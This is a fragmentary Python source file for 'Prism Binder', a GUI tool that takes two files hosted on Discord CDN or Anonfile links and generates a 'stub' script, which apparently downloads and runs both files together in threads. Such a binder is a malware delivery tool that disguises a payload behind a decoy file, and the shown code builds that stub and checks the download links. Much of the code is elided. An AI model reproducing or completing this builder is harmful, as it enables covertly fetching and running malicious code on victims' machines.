...
try:
    ...
    def createfilerq(self):
        ...
        name = self.name.get()
        if "https://cdn.discordapp.com/attachments/" in file1 and "https://cdn.discordapp.com/attachments/" in file2:
            num = 6
        else:
            num = 5
        if len(name) < 1:
...
""")
            f.write(fr"""
def runfile1():
    ext = file1.split("/")[{num}].split(".")[-1]
    filename = file1.split("/")[{num}].split('.')[:-1]
    filename = filename[0]
""")
            f.write(r"""
...
""")
            f.write(fr"""
def runfile2():
    ext2 = file2.split("/")[{num}].split(".")[-1]
    filename2 = file2.split("/")[{num}].split('.')[:-1]
...
t2.start()        
    ...
    def verify(self):
        ...
        name = self.name.get()
        while True:
            if "https://cdn" not in file1:
                messagebox.showerror('Prism Binder || vesper#0003', f'Invalid Discord direct link or Anonfile Direct link');penis=False;break
            else:pass
            if "https://cdn" not in file2:
                messagebox.showerror('Prism Binder || vesper#0003', f'Invalid Discord direct link or Anonfile Direct link');penis=False;break
            else:pass
            if self.isiconon == True:
...
messagebox.showinfo('Prism Binder || vesper#0003', 'Welcome to Prism. Make sure the name used for the stub doesnt have a space. Also, please watch the video tutorial on how to get your discord direct link or video on how to get your Anonfile direct link')
Prism()
window.mainloop()